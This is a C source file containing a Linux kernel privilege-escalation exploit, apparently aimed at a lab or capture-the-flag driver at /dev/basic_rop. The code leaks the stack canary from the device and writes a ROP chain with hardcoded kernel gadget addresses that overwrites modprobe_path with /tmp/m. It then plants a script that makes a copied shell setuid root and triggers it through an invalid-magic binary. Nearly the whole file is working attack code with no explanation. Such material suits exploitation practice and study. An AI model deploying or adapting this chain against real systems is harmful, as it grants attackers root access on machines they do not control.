#define _GNU_SOURCE
#include <sched.h>            
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <stdint.h>
#include <unistd.h>
#include <pthread.h>
#include <x86intrin.h>

#ifndef HEXDUMP_COLS
#define HEXDUMP_COLS 16
#endif

void hexdump(void *mem, unsigned int len)
{
	unsigned int i, j;

	for(i = 0; i < len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : 0); i++)
	{
		/* print offset */
		if(i % HEXDUMP_COLS == 0)
		{
			printf("0x%06x: ", i);
		}

		/* print hex data */
		if(i < len)
		{
			printf("%02x ", 0xFF & ((char*)mem)[i]);
		}
		else /* end of block, just aligning for ASCII dump */
		{
			printf("   ");
		}

		/* print ASCII dump */
		if(i % HEXDUMP_COLS == (HEXDUMP_COLS - 1))
		{
			for(j = i - (HEXDUMP_COLS - 1); j <= i; j++)
			{
				if(j >= len) /* end of block, not really printing */
				{
					putchar(' ');
				}
				else if(isprint(((char*)mem)[j])) /* printable char */
				{
					putchar(0xFF & ((char*)mem)[j]);        
				}
				else /* other char */
				{
					putchar('.');
				}
			}
			putchar('\n');
		}
	}
}


#define BUF_LEN 0x500

void ex(){
    int fd = open( "/dev/basic_rop" , O_RDWR); 
    if(-1 == fd){
        puts("[!] Error while opening dev"); 
        return -1;        
    }

    puts("[-] opened /dev/holstain\n");
    
    char buf[BUF_LEN] = {}; 
	read(fd, buf, BUF_LEN);    

	uint64_t canary = *(uint64_t*)(buf +0x400);
    uint64_t pop_rsi_ret = 0xffffffff8115b91c;
    uint64_t mov_rsi_rax = 0xffffffff813dace3;
    uint64_t pop_rax_rbx_ret = 0xffffffff811f2a0f;
    uint64_t msleep = 0xffffffff810df7b0;
    uint64_t modprobe = 0xffffffff82451020;
    uint64_t tmpm = 0x6d2f706d742f;
    uint64_t pop_rdi = 0xffffffff811719c0;

	uint64_t* ret = &buf[0x408];
	ret[0] = pop_rsi_ret;
    ret[1] = modprobe;
    ret[2] = pop_rax_rbx_ret;
    ret[3] = tmpm;
    ret[4] = 0; //bx
    ret[5] = 0; //r12
    ret[6] = 0; // r13
    ret[7] = 0; //rbp;
    ret[8] = mov_rsi_rax;
    ret[9] = pop_rdi;
    ret[10] = 0x10000000;
    ret[11] = msleep;
	write(fd, buf, 0x470);
	close(fd);
}

void win(){
    system("cp ./shell /tmp/shell");

    system("echo '#!/bin/sh' > /tmp/m");
    system("echo 'chown root:root /tmp/shell' >> /tmp/m");
    system("echo 'chmod u+s /tmp/shell' >> /tmp/m");
    system("chmod +x /tmp/m");

    system("echo -n '\xff\xff\xff\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");

    system("/tmp/dummy");

    system("/tmp/shell");
}

int main(){
    pthread_t th1, th2;
    cpu_set_t t1_cpu;
    cpu_set_t t2_cpu;
    CPU_ZERO(&t1_cpu); // initialize cpu
    CPU_ZERO(&t2_cpu);
    CPU_SET(0, &t1_cpu); //set variable to cpu0
    CPU_SET(1, &t2_cpu); //set variable to cpu0
    pthread_create(&th2, NULL, ex, &t2_cpu);
    sleep(1);
    pthread_create(&th1, NULL, win, &t1_cpu);
    pthread_join(th1, NULL);
}
